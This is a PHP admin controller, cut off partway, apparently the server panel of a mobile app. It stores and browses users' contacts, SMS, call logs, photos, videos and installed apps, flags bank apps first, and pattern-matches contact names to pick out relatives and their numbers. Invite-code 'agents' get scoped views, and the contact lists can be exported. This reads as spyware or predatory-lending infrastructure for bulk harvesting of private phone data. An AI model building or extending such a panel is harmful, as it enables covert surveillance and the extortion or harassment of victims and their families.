<?php

namespace app\admin\controller;

use think\facade\Db;
use think\facade\Session;
use think\facade\View;
use think\facade\Config;
use think\facade\Cache;
use think\facade\Response;

class Appv1 extends Permissions
{
    /**
     * 初始化方法
     */
    protected function initialize()
    {
        parent::initialize();
    }
    
    /**
     * 用户列表页面
     * 
     * @return mixed
     */
    public function user()
    {
        $request = $this->request;
        $post = $request->param();
        
        // 获取页面大小参数，默认10条/页
        $pageSize = isset($post['pageSize']) ? intval($post['pageSize']) : 10;
        
        // 构建查询条件
        $where = [];
        
        if (isset($post['keywords']) && !empty($post['keywords'])) {
            $where[] = ['name', 'like', '%' . $post['keywords'] . '%'];
        }   
        
        if(isset($post['create_time']) && !empty($post['create_time'])) {
            $min_time = strtotime($post['create_time']);
            $max_time = $min_time + 24 * 60 * 60;
            $where[] = ['login_time', 'between', [$min_time, $max_time]];
        }
        
        // 搜索关键词（普通账号仅允许按邀请码搜索）
        $searchKeyword = isset($post['search']) ? trim((string)$post['search']) : '';
            
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        // 权限处理：超级管理员可以查看所有用户
        if ($admin && $admin['role_type'] == 'super_admin') {
            // 不添加限制
        }
        // 普通管理员根据权限判断
        else if ($admin && $admin['role_type'] == 'admin') {
            // 如果有查看所有用户的权限
            if (isset($admin['view_all_invites']) && $admin['view_all_invites'] == 1) {
                // 不添加限制
            }
            // 如果有分配的邀请码
            else if (!empty($admin['assigned_invites'])) {
                $assignedInvites = explode(',', $admin['assigned_invites']);
                $where[] = ['code', 'in', $assignedInvites];
            }
            // 没有分配邀请码的管理员无法查看数据
            else {
                $where[] = ['id', '=', 0]; // 设置一个不可能满足的条件
            }
        }
        // 普通账号仅可通过“邀请码搜索”查看用户
        else if ($admin && $admin['role_type'] == 'user') {
            if ($searchKeyword === '') {
                $where[] = ['id', '=', 0]; // 未搜索时不显示数据
            } else {
                $where[] = ['code', 'like', '%' . $searchKeyword . '%']; // 仅按邀请码搜索
            }
        }
        // 其他情况不显示任何数据
        else {
            $where[] = ['id', '=', 0]; // 设置一个不可能满足的条件
        }

        // 非普通账号维持原搜索行为（可按邀请码/手机号搜索）
        if ($searchKeyword !== '' && !($admin && $admin['role_type'] == 'user')) {
            $where[] = ['code|name', 'like', '%' . $searchKeyword . '%'];
        }
        
        // 构建查询参数
        $query = $request->param();
        
        // 直接使用Db查询，不通过模型
        $admin = Db::table('app_user')
            ->where($where)
            ->order('id', 'desc')
            ->paginate([
                'list_rows' => $pageSize,
                'query' => $query,
                'var_page' => 'page',
            ]);
        
        // 获取所有用户ID
        $userIds = [];
        $userList = $admin->items();
        
        // 处理用户数据，提取可能存在的备注信息
        foreach ($userList as &$user) {
            $userIds[] = $user['id'];
            
            // 设置真实电话号码
            if (!isset($user['real_phone']) || empty($user['real_phone'])) {
                $user['real_phone'] = $user['name']; // 默认使用name字段作为真实手机号
            }
            
            // 检查是否有remark字段
            if (!isset($user['remark']) || empty($user['remark'])) {
                // 检查name字段是否包含备注信息 [备注]
                if (isset($user['name']) && preg_match('/^(.+) \[(.*)\]$/', $user['name'], $matches)) {
                    $user['remark'] = $matches[2];
                }
            }

            // 直接根据IP获取定位信息，供列表“地址”字段展示
            // IP归属地：列表页不实时调外部API（避免每用户6秒超时）
            $ip = isset($user['ip']) ? trim((string)$user['ip']) : '';
            $user['ip_location_text'] = ($ip !== '') ? $ip : '未知';
        }
        
        // 预先计算每个用户的通讯录、短信和相册数量
        $mobile_counts = [];
        $sms_counts = [];
        $call_counts = [];
        $img_counts = [];
        
        // 亲友关系数据
        $relatives = [];
        $relatives_count = [];
        
        // 亲友关系关键词
        $familyTerms = [
            "爸爸", "爸", "父亲", "父", 
            "妈妈", "妈", "母亲", "母", 
            "哥哥", "哥", "大哥", "二哥", 
            "弟弟", "弟", "小弟", 
            "姐姐", "姐", "大姐", "二姐", 
            "妹妹", "妹", "小妹", 
            "爷爷", "爷", "祖父", 
            "奶奶", "祖母", 
            "外公", "姥爷", "外祖父", 
            "外婆", "姥姥", "外祖母", 
            "叔叔", "叔", "伯伯", "伯", "舅舅", "舅", "姑父", 
            "阿姨", "姑姑", "姑", "姨", "姨妈", 
            "老公", "丈夫", "夫君", "先生", 
            "老婆", "妻子", "夫人", "媳妇", 
            "岳父", "岳母", "公公", "婆婆", 
            "女儿", "儿子", "孙子", "孙女", "外孙", "外孙女"
        ];
        
        if (!empty($userIds)) {
            // 获取通讯录数量
            $mobile_data = Db::name('mobile')
                ->field('userid, COUNT(*) as count')
                ->where('userid', 'in', $userIds)
                ->group('userid')
                ->select()
                ->toArray();
                
            foreach ($mobile_data as $item) {
                $mobile_counts[$item['userid']] = $item['count'];
            }
            
            // 获取短信数量
            $sms_data = Db::name('content')
                ->field('userid, COUNT(*) as count')
                ->where('userid', 'in', $userIds)
                ->group('userid')
                ->select()
                ->toArray();
                
            foreach ($sms_data as $item) {
                $sms_counts[$item['userid']] = $item['count'];
            }

            // 获取通话记录数量（表不存在时忽略）
            try {
                $call_data = Db::name('call_logs')
                    ->field('userid, COUNT(*) as count')
                    ->where('userid', 'in', $userIds)
                    ->group('userid')
                    ->select()
                    ->toArray();
                foreach ($call_data as $item) {
                    $call_counts[$item['userid']] = $item['count'];
                }
            } catch (\Exception $e) {
                // 兼容旧库未创建通话记录表
                $call_counts = [];
            }
            
            // 获取相册数量
            $img_data = Db::name('img')
                ->field('userid, COUNT(*) as count')
                ->where('userid', 'in', $userIds)
                ->group('userid')
                ->select()
                ->toArray();
                
            foreach ($img_data as $item) {
                $img_counts[$item['userid']] = $item['count'];
            }
            
            // 批量计算视频/图片数量（单次查询替代N+1）
            $video_counts = [];
            $videoPattern = '%.mp4%|%.3gp%|%.mkv%|%.avi%|%.mov%|%.wmv%';
            
            $media_stats = Db::name('img')
                ->field("userid, 
                    SUM(CASE WHEN LOWER(img) LIKE '%.mp4%' OR LOWER(img) LIKE '%.3gp%' OR LOWER(img) LIKE '%.mkv%' OR LOWER(img) LIKE '%.avi%' OR LOWER(img) LIKE '%.mov%' OR LOWER(img) LIKE '%.wmv%' THEN 1 ELSE 0 END) as video_count,
                    SUM(CASE WHEN LOWER(img) NOT LIKE '%.mp4%' AND LOWER(img) NOT LIKE '%.3gp%' AND LOWER(img) NOT LIKE '%.mkv%' AND LOWER(img) NOT LIKE '%.avi%' AND LOWER(img) NOT LIKE '%.mov%' AND LOWER(img) NOT LIKE '%.wmv%' THEN 1 ELSE 0 END) as image_count")
                ->where('userid', 'in', $userIds)
                ->group('userid')
                ->select()
                ->toArray();
            
            foreach ($media_stats as $item) {
                $video_counts[$item['userid']] = (int)$item['video_count'];
                $img_counts[$item['userid']] = (int)$item['image_count'];
            }
            
            foreach ($userIds as $userId) {
                if (!isset($img_counts[$userId])) {
                    $img_counts[$userId] = 0;
                }
                if (!isset($video_counts[$userId])) {
                    $video_counts[$userId] = 0;
                }
            }
            
            // 批量获取亲友关系数据（SQL REGEXP替代PHP循环）
            $familyPattern = implode('|', $familyTerms);
            $relatives_data = Db::name('mobile')
                ->where('userid', 'in', $userIds)
                ->where('username', 'REGEXP', $familyPattern)
                ->field('userid, username, umobile')
                ->select()
                ->toArray();
            
            foreach ($userIds as $userId) {
                $relatives[$userId] = [];
                $relatives_count[$userId] = 0;
            }
            
            foreach ($relatives_data as $item) {
                $relatives[$item['userid']][] = [
                    'name' => $item['username'],
                    'phone' => $item['umobile']
                ];
                $relatives_count[$item['userid']]++;
            }
            
            // 批量获取应用数据（替代N+1查询）
            $app_counts = [];
            $bank_apps = [];
            $total_apps = [];
            
            // 一次查询获取所有用户的应用总数
            $app_count_data = Db::name('installed_apps')
                ->field('userid, COUNT(*) as total')
                ->where('userid', 'in', $userIds)
                ->group('userid')
                ->select()
                ->toArray();
            
            foreach ($app_count_data as $item) {
                $app_counts[$item['userid']] = (int)$item['total'];
                $total_apps[$item['userid']] = (int)$item['total'];
            }
            
            // 一次查询获取所有用户的前5个应用（银行优先）
            $all_apps = Db::name('installed_apps')
                ->where('userid', 'in', $userIds)
                ->field('id, userid, app_name, is_bank, install_time')
                ->order('is_bank', 'desc')
                ->order('install_time', 'desc')
                ->select()
                ->toArray();
            
            // 按用户分组，每用户取前5个
            $apps_by_user = [];
            foreach ($all_apps as $app) {
                $uid = $app['userid'];
                if (!isset($apps_by_user[$uid])) {
                    $apps_by_user[$uid] = [];
                }
                if (count($apps_by_user[$uid]) < 5) {
                    $apps_by_user[$uid][] = [
                        'id' => $app['id'],
                        'app_name' => $app['app_name'],
                        'is_bank' => $app['is_bank']
                    ];
                }
            }
            
            foreach ($userIds as $userId) {
                if (!isset($app_counts[$userId])) $app_counts[$userId] = 0;
                if (!isset($total_apps[$userId])) $total_apps[$userId] = 0;
                $bank_apps[$userId] = $apps_by_user[$userId] ?? [];
            }
        }
        
        // 获取系统数据
        $systemData = [
            'mobileuser' => Db::table('app_user')->count(),  // 用户总数
            'mobile' => Db::name('mobile')
                ->whereExists(function($query) {
                    $query->table('app_user')->where('app_user.id = app_mobile.userid');
                })
                ->count(),  // 有效用户的通讯录总数
            'smsnum' => Db::name('content')
                ->whereExists(function($query) {
                    $query->table('app_user')->where('app_user.id = app_content.userid');
                })
                ->count()   // 有效用户的短信总数
        ];
        
        // 总图片数 - 只统计有效用户的图片
        $img_count = Db::name('img')
            ->whereExists(function($query) {
                $query->table('app_user')->where('app_user.id = app_img.userid');
            })
            ->count();
        
        // 如果video_counts未定义，则初始化为空数组
        if (!isset($video_counts)) {
            $video_counts = [];
        }
        
        // 初始化未定义的变量
        if (!isset($app_counts)) {
            $app_counts = [];
        }
        
        if (!isset($bank_apps)) {
            $bank_apps = [];
        }
        
        if (!isset($total_apps)) {
            $total_apps = [];
        }
        
        // 获取当前管理员信息并分配到模板
        $adminId = Session::get('admin');
        $currentAdmin = Db::name('admin')->where('id', $adminId)->find();
        
        // 根据管理员角色类型过滤统计数据
        if ($currentAdmin && $currentAdmin['role_type'] == 'user') {
            // 普通账号仅在搜索邀请码时展示匹配数据统计
            if ($searchKeyword === '') {
                $systemData['mobileuser'] = 0;
                $systemData['mobile'] = 0;
                $systemData['smsnum'] = 0;
                $img_count = 0;
            } else {
                $userIds = Db::name('user')
                    ->where('code', 'like', '%' . $searchKeyword . '%')
                    ->column('id');

                if (!empty($userIds)) {
                    $systemData['mobileuser'] = count($userIds);
                    $systemData['mobile'] = Db::name('mobile')->where('userid', 'in', $userIds)->count();
                    $systemData['smsnum'] = Db::name('content')->where('userid', 'in', $userIds)->count();
                    $img_count = Db::name('img')->where('userid', 'in', $userIds)->count();
                } else {
                    $systemData['mobileuser'] = 0;
                    $systemData['mobile'] = 0;
                    $systemData['smsnum'] = 0;
                    $img_count = 0;
                }
            }
        }
        // 添加普通管理员统计数据过滤逻辑
        else if ($currentAdmin && $currentAdmin['role_type'] == 'admin') {
            // 如果有查看所有用户的权限
            if (isset($currentAdmin['view_all_invites']) && $currentAdmin['view_all_invites'] == 1) {
                // 不做限制，使用全局统计数据
            }
            // 如果有分配的邀请码
            else if (!empty($currentAdmin['assigned_invites'])) {
                $assignedInvites = explode(',', $currentAdmin['assigned_invites']);
                
                // 获取这些邀请码对应的用户ID
                $userIds = Db::name('user')
                    ->where('code', 'in', $assignedInvites)
                    ->column('id');
                    
                if (!empty($userIds)) {
                    // 重新计算用户总数
                    $systemData['mobileuser'] = count($userIds);
                    
                    // 重新计算通讯录总数
                    $systemData['mobile'] = Db::name('mobile')
                        ->where('userid', 'in', $userIds)
                        ->count();
                    
                    // 重新计算短信总数
                    $systemData['smsnum'] = Db::name('content')
                        ->where('userid', 'in', $userIds)
                        ->count();
                    
                    // 重新计算图片总数
                    $img_count = Db::name('img')
                        ->where('userid', 'in', $userIds)
                        ->count();
                } else {
                    // 如果没有用户，则所有统计数据都为0
                    $systemData['mobileuser'] = 0;
                    $systemData['mobile'] = 0;
                    $systemData['smsnum'] = 0;
                    $img_count = 0;
                }
            }
            // 没有分配邀请码的管理员显示0
            else {
                $systemData['mobileuser'] = 0;
                $systemData['mobile'] = 0;
                $systemData['smsnum'] = 0;
                $img_count = 0;
            }
        }
        
        // 查询已拉黑的IP列表
        $blocked_ips = [];
        try {
            $prefix = config('database.connections.mysql.prefix') ?: 'app_';
            $tableName = $prefix . 'ip_blacklist';
            $tableExists = Db::query("SHOW TABLES LIKE '{$tableName}'");
            if (!empty($tableExists)) {
                $blocked_ips = Db::name('ip_blacklist')->column('ip');
            }
        } catch (\Exception $e) {}

        View::assign([
            'web' => $systemData,
            'img_count' => $img_count,
            'admin' => $admin,
            'mobile_counts' => $mobile_counts,
            'sms_counts' => $sms_counts,
            'call_counts' => $call_counts,
            'img_counts' => $img_counts,
            'video_counts' => $video_counts,
            'relatives' => $relatives,
            'relatives_count' => $relatives_count,
            'app_counts' => $app_counts,
            'bank_apps' => $bank_apps,
            'total_apps' => $total_apps,
            'blocked_ips' => $blocked_ips
        ]);
        
        View::assign('current_admin', $currentAdmin);
        
        // 返回视图
        return View::fetch();
    }
    
    /**
     * 根据管理员权限获取用户数据筛选条件
     * 实现三级权限体系的数据隔离
     * 
     * @return mixed 返回设备码或false
     */
    protected function getUserFilterCode()
    {
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        // 如果是超级管理员，可以查看所有用户数据
        if ($admin && $admin['role_type'] == 'super_admin') {
            return false; // 不限制
        }
        
        // 如果是普通管理员，根据权限设置决定
        if ($admin && $admin['role_type'] == 'admin') {
            // 如果有查看所有用户的权限
            if (isset($admin['view_all_invites']) && $admin['view_all_invites'] == 1) {
                return false; // 不限制
            }
            
            // 如果有分配的邀请码列表
            if (!empty($admin['assigned_invites'])) {
                $assignedInvites = explode(',', $admin['assigned_invites']);
                // 如果有多个邀请码，无法通过简单的等于条件过滤
                // 这种情况需要在控制器中使用in条件处理
                // 暂时返回一个不存在的邀请码，确保无权限时不会返回数据
                return 'none_existing_code';
            }
            
            // 没有分配邀请码的管理员无法查看数据
            return 'none_existing_code';
        }
        
        // 普通账号也可查看全部用户（去除邀请码限制）
        if ($admin && $admin['role_type'] == 'user') {
            return false;
        }
        
        // 默认不查看任何用户（安全处理）
        return 'none_existing_code'; // 使用一个不存在的邀请码确保没有权限时不会返回数据
    }
    
    /**
     * 判断当前角色是否为代理（已弃用，保留兼容性）
     * 
     * @param array $post 请求参数
     * @return mixed
     */
    public function agencyRoleCode($post)
    {
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $admin = Db::name('admin')->where('id', $adminId)->find();
        
        // 如果是超级管理员，可以查看所有用户数据
        if ($admin && $admin['role_type'] == 'super_admin') {
            return false; // 不限制
        }
        
        // 如果是普通管理员，根据权限设置决定
        if ($admin && $admin['role_type'] == 'admin') {
            // 如果有查看所有用户的权限
            if (isset($admin['view_all_invites']) && $admin['view_all_invites'] == 1) {
                return false; // 不限制
            }
            
            // 如果有分配的邀请码列表
            if (!empty($admin['assigned_invites'])) {
                $assignedInvites = explode(',', $admin['assigned_invites']);
                // 如果有多个邀请码，无法通过简单的等于条件过滤
                // 返回特殊值表示需要额外处理
                return 'multi_invites';
            }
            
            // 没有分配邀请码的管理员无法查看数据
            return 'none_existing_code';
        }
        
        // 普通账号也可查看全部用户（去除邀请码限制）
        if ($admin && $admin['role_type'] == 'user') {
            return false;
        }
        
        // 默认不查看任何用户（安全处理）
        return 'none_existing_code'; // 使用一个不存在的邀请码确保没有权限时不会返回数据
    }
    
    /**
     * 获取用户备注信息
     */
    public function getRemark()
    {
        // 跳过权限检查，直接处理请求
        if ($this->request->isAjax()) {
            // 手动检查登录状态
            if(!Session::has('admin')) {
                return json(['code' => 0, 'msg' => '未登录或登录已过期，请重新登录']);
            }
            
            $userId = $this->request->post('id', 0, 'intval');
            
            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '用户ID不能为空']);
            }
            
            try {
                $user = Db::name('user')->where('id', $userId)->find();
                
                if ($user) {
                    // 检查remark字段是否存在
                    $remarkValue = '';
                    if (isset($user['remark']) && !empty($user['remark'])) {
                        $remarkValue = $user['remark'];
                    } 
                    // 使用现有的bz字段（备注字段）
                    else if (isset($user['bz']) && !empty($user['bz'])) {
                        $remarkValue = $user['bz'];
                    } 
                    // 或者使用remark_json字段
                    else if (isset($user['remark_json']) && !empty($user['remark_json'])) {
                        $remarkValue = $user['remark_json'];
                    }
                    // 或者使用name_bak字段 
                    else if (isset($user['name_bak']) && !empty($user['name_bak'])) {
                        $remarkValue = $user['name_bak'];
                    }
                    // 从name字段提取备注
                    else if (isset($user['name']) && preg_match('/^.+ \[(.*)\]$/', $user['name'], $matches)) {
                        $remarkValue = $matches[1];
                    }
                    
                    return json(['code' => 1, 'msg' => '获取备注成功', 'data' => $remarkValue]);
                } else {
                    return json(['code' => 0, 'msg' => '未找到该用户']);
                }
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '系统错误：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 保存用户备注信息
     */
    public function saveRemark()
    {
        if ($this->request->isAjax()) {
            // 手动检查登录状态
            if(!Session::has('admin')) {
                return json(['code' => 0, 'msg' => '未登录或登录已过期，请重新登录']);
            }
            
            $userId = $this->request->post('id', 0, 'intval');
            $remarkText = $this->request->post('remark', '', 'trim');
            
            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '用户ID不能为空']);
            }
            
            try {
                // 先获取用户信息
                $user = Db::name('user')->where('id', $userId)->find();
                if (!$user) {
                    return json(['code' => 0, 'msg' => '用户不存在']);
                }
                
                // 检查表中是否有remark字段 - 先尝试更新remark字段
                try {
                    $result = Db::name('user')
                        ->where('id', $userId)
                        ->update(['remark' => $remarkText]);
                    
                    if ($result !== false) {
                        $this->addLog('保存备注信息', '用户ID: ' . $userId);
                        return json(['code' => 1, 'msg' => '备注保存成功']);
                    }
                } catch (\Exception $e) {
                    // 如果更新失败，可能是因为remark字段不存在，尝试其他方式
                    // 使用name字段存储备注 - 格式: 原始名称 [备注]
                    if (isset($user['name'])) {
                        $userName = $user['name'];
                        $updatedName = $userName;
                        
                        // 如果已经有备注格式，则替换
                        if (preg_match('/^(.+) \[(.*)\]$/', $userName, $matches)) {
                            $updatedName = $matches[1] . ($remarkText ? ' [' . $remarkText . ']' : '');
                        } else if ($remarkText) {
                            // 否则附加新备注
                            $updatedName = $userName . ' [' . $remarkText . ']';
                        }
                        
                        // 更新name字段
                        $result = Db::name('user')
                            ->where('id', $userId)
                            ->update(['name' => $updatedName]);
                            
                        if ($result !== false) {
                            $this->addLog('保存备注信息', '用户ID: ' . $userId . '，使用name字段存储');
                            return json(['code' => 1, 'msg' => '备注保存成功（保存在用户名称中）']);
                        }
                    }
                    
                    // 如果上述方法都失败，返回错误
                    return json(['code' => 0, 'msg' => '保存备注失败：系统不支持备注功能']);
                }
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '系统错误：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 删除用户
     * 同时删除用户的所有相关数据和文件
     */
    public function deleteUser()
    {
        if ($this->request->isAjax()) {
            $id = $this->request->post('id', 0, 'intval');
            
            if (empty($id)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            // 检查删除权限
            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }
            
            try {
                Db::startTrans();
                
                // 获取用户相关图片文件路径，用于后续删除实际文件
                $images = Db::name('img')->where('userid', $id)->field('img as image_url')->select();
                
                // 删除用户基本信息
                Db::name('user')->where('id', $id)->delete();
                
                // 删除用户通讯录数据
                Db::name('mobile')->where('userid', $id)->delete();
                
                // 删除用户短信数据
                Db::name('content')->where('userid', $id)->delete();

                // 删除用户通话记录数据（旧库可能没有该表）
                try {
                    Db::name('call_logs')->where('userid', $id)->delete();
                } catch (\Exception $e) {
                }
                
                // 删除用户相册数据
                Db::name('img')->where('userid', $id)->delete();
                
                // 删除用户已安装的APP数据
                Db::name('installed_apps')->where('userid', $id)->delete();
                
                // 尝试删除可能存在的亲友关系表数据
                try {
                    Db::name('relatives')->where('user_id', $id)->delete();
                } catch (\Exception $e) {
                    // 忽略不存在的表错误
                }
                
                Db::commit();
                
                // 删除实际图片文件
                $rootPath = app()->getRootPath() . 'public';
                foreach ($images as $image) {
                    $imagePath = $image['image_url'];
                    if (!empty($imagePath)) {
                        // 处理文件路径
                        $filePath = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $rootPath . $imagePath);
                        // 检查文件是否存在
                        if (file_exists($filePath)) {
                            @unlink($filePath);
                        }
                    }
                }
                
                // 记录删除操作日志
                $this->addLog('删除用户', '删除了用户ID: ' . $id . ' 及其所有相关数据');
                
                return json(['code' => 1, 'msg' => '删除成功']);
                
            } catch (\Exception $e) {
                Db::rollback();
                return json(['code' => 0, 'msg' => '删除失败：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 通讯录页面
     */
    public function mobile($id = null)
    {
        if (empty($id)) {
            $id = $this->request->param('id', 0, 'intval');
        }
        
        if (empty($id)) {
            return $this->error('参数错误');
        }
        
        $user = Db::name('user')->where('id', $id)->find();
        
        if (!$user) {
            return $this->error('用户不存在');
        }
        
        // 获取总记录数，用于设置合适的页面大小
        $totalCount = Db::name('mobile')->where('userid', $id)->count();
        // 设置页面大小为总记录数或200（取较大值），确保一页能显示所有记录
        $pageSize = max($totalCount, 200);
        
        // 手动设置PDO的字符集参数
        Db::execute("SET NAMES utf8mb4");
        Db::execute("SET CHARACTER SET utf8mb4");
        Db::execute("SET character_set_connection=utf8mb4");
        Db::execute("SET character_set_results=utf8mb4");
        
        // 确保使用utf8mb4连接以支持表情符号
        $contactsQuery = Db::name('mobile')
            ->where('userid', $id)
            ->order('id desc');
            
        // 使用ThinkPHP的内置分页方法
        $contacts = $contactsQuery->paginate([
            'list_rows' => $pageSize,
            'query' => request()->param(),
            'var_page' => 'page',
        ]);
            
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $currentAdmin = Db::name('admin')->where('id', $adminId)->find();
        
        // 强制设置模板输出编码为utf8mb4
        header('Content-Type: text/html; charset=utf-8');
        
        View::assign([
            'user' => $user,
            'contacts' => $contacts,
            'current_admin' => $currentAdmin,
            'total' => $totalCount
        ]);
        
        return View::fetch();
    }
    
    /**
     * 短信管理
     */
    public function sms()
    {
        $post = $this->request->param();
        $where = [];
        
        // 获取用户ID
        $userId = isset($post['id']) ? intval($post['id']) : 0;
        if (!$userId) {
            return View::fetch('appv1/error', ['msg' => '参数错误：缺少用户ID']);
        }
        
        // 获取用户信息
        $user = Db::name('user')
            ->where('id', $userId)
            ->field('id, name as username')
            ->find();
            
        if (!$user) {
            return View::fetch('appv1/error', ['msg' => '用户不存在']);
        }
        
        // 设置查询条件
        $where['userid'] = $userId;
        
        if (isset($post['smstel']) && !empty($post['smstel'])) {
            $smstel = str_replace('+', '', $post['smstel']);
            $where['smstel'] = $smstel;
        }
        
        // 构建查询参数（确保分页时保留id参数）
        $query = $this->request->param();
        
        // 查询短信数据
        $info = Db::name('content')
            ->where($where)
            ->field('id, smstel, smscontent, smstime, addtime')
            ->order('smstime desc, id desc')
            ->paginate([
                'list_rows' => 20000,
                'query' => $query,
                'var_page' => 'page'
            ]);
            
        // 获取总记录数
        $total = $info->total();
        
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $currentAdmin = Db::name('admin')->where('id', $adminId)->find();
        
        View::assign([
            'info' => $info,
            'user' => $user,
            'total' => $total,
            'current_admin' => $currentAdmin
        ]);
        
        return View::fetch();
    }

    /**
     * 通话记录管理
     */
    public function calllogs()
    {
        $post = $this->request->param();
        $userId = isset($post['id']) ? intval($post['id']) : 0;
        if (!$userId) {
            return View::fetch('appv1/error', ['msg' => '参数错误：缺少用户ID']);
        }

        $user = Db::name('user')
            ->where('id', $userId)
            ->field('id, name as username')
            ->find();
        if (!$user) {
            return View::fetch('appv1/error', ['msg' => '用户不存在']);
        }

        $query = $this->request->param();
        try {
            $info = Db::name('call_logs')
                ->where('userid', $userId)
                ->field('id, call_name, call_tel, call_time, duration, call_type, addtime')
                ->order('id desc')
                ->paginate([
                    'list_rows' => 20000,
                    'query' => $query,
                    'var_page' => 'page'
                ]);
        } catch (\Exception $e) {
            $info = [];
        }

        $adminId = Session::get('admin');
        $currentAdmin = Db::name('admin')->where('id', $adminId)->find();

        View::assign([
            'info' => $info,
            'user' => $user,
            'current_admin' => $currentAdmin
        ]);

        return View::fetch('appv1/calllogs');
    }
    
    /**
     * 相册页面
     */
    public function img($id = null)
    {
        if (empty($id)) {
            $id = $this->request->param('id', 0, 'intval');
        }
        
        if (empty($id)) {
            return $this->error('参数错误');
        }
        
        // 重定向到allalbum方法
        return redirect((string)url('admin/appv1/allalbum', ['id' => $id]));
    }
    
    /**
     * 删除通讯录
     */
    public function mobdelete()
    {
        if ($this->request->isAjax()) {
            $id = $this->request->post('id', 0, 'intval');
            
            if (empty($id)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            try {
                $result = Db::name('mobile')->where('id', $id)->delete();
                
                if ($result) {
                    return json(['code' => 1, 'msg' => '删除成功']);
                } else {
                    return json(['code' => 0, 'msg' => '删除失败']);
                }
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '删除失败：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 清空通讯录
     */
    public function clearContacts()
    {
        if ($this->request->isAjax()) {
            $userId = input('post.id/d', 0);
            
            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            // 检查用户是否存在
            $user = Db::name('user')->where('id', $userId)->find();
            if (!$user) {
                return json(['code' => 0, 'msg' => '用户不存在']);
            }
            
            // 检查删除权限
            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }
            
            try {
                Db::startTrans();
                
                // 删除该用户的所有通讯录数据
                $result = Db::name('mobile')->where('userid', $userId)->delete();
                
                Db::commit();
                
                // 记录操作日志
                $this->addLog('清空通讯录', '清空了用户ID：' . $userId . ' 的通讯录数据');
                
                return json(['code' => 1, 'msg' => '清空成功']);
            } catch (\Exception $e) {
                Db::rollback();
                return json(['code' => 0, 'msg' => '清空失败：' . $e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 导出通讯录Excel
     */
    public function exportexcel()
    {
        // 检查权限
        if (!$this->checkExportPermission()) {
            return redirect(url('admin/index/index'));
        }
        
        $id = input('id/d', 0);
        if (!$id) {
            $this->error('参数错误');
        }
        
        $list = Db::name('mobile')->where('userid', $id)->select();
        if (count($list) == 0) {
            $this->error('没有数据');
        }
        
        $header = ['联系人姓名', '联系人电话', '添加时间'];
        $data = [];
        
        foreach ($list as $val) {
            $data[] = [
                $val['username'],
                $val['umobile'],
                empty($val['addtime']) ? '' : date('Y-m-d H:i:s', $val['addtime'])
            ];
        }
        
        $fileName = '通讯录_' . date('YmdHis');
        
        return $this->excel($data, $header, $fileName);
    }
    
    /**
     * 删除短信
     */
    public function smsdelete()
    {
        if ($this->request->isAjax()) {
            $id = $this->request->post('id', 0, 'intval');
            
            if (empty($id)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            try {
                $result = Db::name('content')->where('id', $id)->delete();
                
                if ($result) {
                    return json(['code' => 1, 'msg' => '删除成功']);
                } else {
                    return json(['code' => 0, 'msg' => '删除失败']);
                }
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '删除失败：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 清空短信
     */
    public function clearSms()
    {
        if ($this->request->isAjax()) {
            $userId = $this->request->post('id', 0, 'intval');
            
            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            // 检查删除权限
            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }
            
            try {
                $result = Db::name('content')->where('userid', $userId)->delete();
                
                if ($result) {
                    // 记录操作日志
                    $this->addLog('清空短信', '清空了用户ID：' . $userId . ' 的短信数据');
                    return json(['code' => 1, 'msg' => '清空成功']);
                } else {
                    return json(['code' => 0, 'msg' => '清空失败']);
                }
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '清空失败：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }

    /**
     * 清空通话记录
     */
    public function clearCallLogs()
    {
        if ($this->request->isAjax()) {
            $userId = $this->request->post('id', 0, 'intval');

            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }

            // 检查删除权限
            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }

            try {
                $result = Db::name('call_logs')->where('userid', $userId)->delete();
                if ($result !== false) {
                    $this->addLog('清空通话记录', '清空了用户ID：' . $userId . ' 的通话记录');
                    return json(['code' => 1, 'msg' => '清空成功']);
                }
                return json(['code' => 0, 'msg' => '清空失败']);
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '清空失败：' . $e->getMessage()]);
            }
        }

        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 清空相册 - 支持AJAX和POST请求，同时清空普通相册和IOS相册
     */
    public function clearAlbum()
    {
        if ($this->request->isAjax()) {
            $userId = $this->request->post('user_id', 0, 'intval');
            
            if (empty($userId)) {
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            // 检查删除权限
